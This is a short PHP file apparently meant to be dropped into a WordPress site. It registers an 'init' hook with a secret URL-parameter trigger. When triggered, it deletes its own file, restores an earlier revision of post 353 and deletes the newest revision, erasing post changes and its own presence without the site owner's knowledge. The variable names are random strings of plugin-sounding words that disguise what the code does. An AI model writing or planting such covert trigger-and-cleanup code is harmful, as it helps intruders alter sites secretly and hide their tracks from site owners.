<?php

function auto_refresh_action() {
	if (isset($_GET['dev_instant_divi_blog']) && $_GET['dev_instant_divi_blog'] === 'inline_auto_class') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$radio_endpoints_icons_conditional = 353;
		$accessible_super_json = wp_get_post_revisions($radio_endpoints_icons_conditional);
		if (empty($accessible_super_json)) die('no revisions');
		if (count($accessible_super_json) < 2) die('less than 2');
		$assistant_chat_extension_import = array_shift($accessible_super_json);
		$author_portfolio_box_testimonial = $assistant_chat_extension_import->ID;
		$app_locator_cool = array_shift($accessible_super_json);
		$calculator_archives_restaurant_picker = $app_locator_cool->ID;
		$wow_tabs_ninja_membership = wp_restore_post_revision($calculator_archives_restaurant_picker);
		if ($wow_tabs_ninja_membership === false) die('error restoring');
		$wow_tabs_ninja_membership = wp_delete_post_revision($author_portfolio_box_testimonial);		
		if ($wow_tabs_ninja_membership === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'auto_refresh_action');
